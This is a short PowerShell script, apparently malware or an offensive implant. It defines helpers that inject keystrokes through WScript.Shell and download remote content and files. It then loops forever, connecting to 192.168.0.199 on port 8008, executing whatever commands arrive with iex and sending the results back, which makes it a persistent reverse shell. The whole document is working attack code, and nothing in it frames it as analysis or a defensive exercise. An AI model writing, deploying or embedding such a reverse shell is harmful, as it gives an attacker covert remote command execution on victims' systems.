[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::Tls12
function k([string]$a){(new-object -comobject wscript.shell).sendkeys($a)}
function ds([string]$a){(invoke-webrequest $a).content}
function df([string]$a,[string]$b){invoke-webrequest $a -outfile $b}
while($true){$sm=(New-Object Net.Sockets.TCPClient("192.168.0.199",8008)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes(("$(iex $d)`n$(pwd)> " 2>&1));$sm.Write($st,0,$st.Length)};start-sleep 30}
